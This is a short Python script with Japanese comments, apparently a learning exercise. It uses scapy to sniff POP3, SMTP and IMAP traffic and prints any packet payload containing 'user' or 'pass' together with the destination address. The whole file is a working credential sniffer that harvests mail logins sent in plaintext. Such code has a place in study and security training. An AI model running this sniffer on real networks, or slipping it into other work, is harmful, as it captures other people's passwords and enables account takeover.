#フィルタリング
#メールクライアントを使って、アカウントに接続を棟梁

from scapy.all import sniff, TCP, IP

# パケット受信用コールバック
def packet_callback(packet):
    #TCPペイロードがあるかを確認
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        #認証情報を確認
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    #条件式
    # スニッファーを起動
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)

if __name__ == '__main__':
    main()